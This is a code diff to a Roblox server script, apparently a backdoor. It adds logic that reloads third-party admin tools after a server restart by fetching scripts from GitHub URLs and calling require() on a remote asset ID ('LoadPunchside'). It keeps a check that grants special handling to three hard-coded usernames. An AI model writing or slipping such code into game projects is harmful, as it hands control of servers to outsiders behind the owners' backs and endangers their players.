@@ -1,7 +1,59 @@
-print("knocks loadered!!!!")
-
-game.Players.ChildAdded:Connect(function(v)
+game.Players.PlayerAdded:Connect(function(v)
     repeat task.wait() until v and v.Character or not game.Players:FindFirstChild(v.Name)
+
+    local data = v:GetJoinData()
+
+    if data and data.TeleportData then
+        if data.TeleportData.softshutdowned == true then
+			
+			local m = Instance.new("Message", workspace)
+			m.Text = "cxo: You are being teleported to a new fresh server."
+			
+			if data.TeleportData.cxo then
+				game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players:GetPlayers(), {cxo = true})
+			elseif data.TeleportData.dizzy then
+				game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players:GetPlayers(), {dizzy = true})
+			elseif data.TeleportData.punchy then
+				game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players:GetPlayers(), {punchy = true})
+			else
+				game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players:GetPlayers())
+			end
+
+		else -- this part loads our admin back after the server is fresh
+			if data.TeleportData.cxo then
+                local success, err = pcall(function()
+    				return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/admin")
+    			end)
+    
+    			if success then
+    				warn("[cxo's admin]: Reloaded!")
+    			else
+    				warn("[cxo's admin]: Failed to reload: ", err)
+    			end
+            elseif data.TeleportData.dizzy then
+			local success, err = pcall(function()
+				return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/FMFAU/Random/refs/heads/main/DeLuaAdmin.lua")
+			end)
+
+			if success then
+				warn("[Dizzy's admin]: Reloaded!")
+			else
+				warn("[Dizzy's admin]: Failed to reload: ", err)
+			end
+            elseif data.TeleportData.punchy then
+                local success, err = pcall(function()
+    				return require(115513593459588).LoadPunchside()
+    			end)
+    
+    			if success then
+    				warn("[PUNCHSIDE]: Reloaded!")
+    			else
+    				warn("[PUNCHSIDE]: Failed to reload: ", err)
+    			end
+            end
+		end
+    end
+
     if (v.Name == "ripcxo" or v.Name == "Trogdor973" or v.Name == "Dekryptionite") and game:GetService("ReplicatedStorage"):FindFirstChild("WeaponsSystem") then
 
         if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
